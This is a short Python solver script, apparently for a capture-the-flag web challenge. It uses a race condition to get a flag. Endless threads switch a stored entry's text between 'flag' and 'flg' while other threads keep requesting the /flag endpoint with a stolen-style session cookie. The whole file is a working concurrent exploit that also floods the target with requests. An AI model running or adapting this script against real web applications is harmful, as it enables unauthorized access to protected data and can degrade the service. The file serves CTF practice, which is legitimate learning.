#!/usr/bin/python3
import sys
from requests import post, get

if len(sys.argv) != 4:
    print("Uso: python3 solver.py <URL_BASE> <COOKIE> <ID_TEXTO_YA_CREADO>")
    print("Ejemplo: python3 solver.py http://example.com:5001 eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6Impvc2UifQ.aKIH5w.HY5chJPqbx9a6fpXckoiJb8Jze8 3")
    sys.exit(1)

BASE_URL = sys.argv[1].rstrip("/")  # Asegura que no termine en "/"
# PONER COOKIE AQUI
token = sys.argv[2]

global_entry_id = sys.argv[3]

N = 10

# Communication with the app
def mod1(token):
  cookies = {"session": token}
  return post("{}/home".format(BASE_URL), cookies=cookies, data={"new_text_{}".format(global_entry_id):"flag","action":"modify_{}".format(global_entry_id)})

def get1(token):
  cookies = {"session": token}
  r = get("{}/flag?id={}".format(BASE_URL, global_entry_id), cookies=cookies)
  if "nnctf" in r.text:
    print(r.text)
  return r


def mod2(token):
  cookies = {"session": token}
  return post("{}/home".format(BASE_URL), cookies=cookies, data={"new_text_{}".format(global_entry_id):"flg","action":"modify_{}".format(global_entry_id)})


# Threads Classes
import threading
import time
class Get1(threading.Thread):
 def run(self):
    while True:
      try:
        get1(token)
      except:
        pass 

class Modi1(threading.Thread):
 def run(self):
    while True:
      try:
        mod1(token)
      except:
        pass

class Modi2(threading.Thread):
 def run(self): 
    while True:
      try:
        mod2(token)
      except:
        pass 

if __name__ == "__main__":
  t1 = []
  for _ in range(N):
    t1.append(Modi1())
    t1[-1].start()
    t1.append(Modi2())
    t1[-1].start()
    t1.append(Get1())
    t1[-1].start()


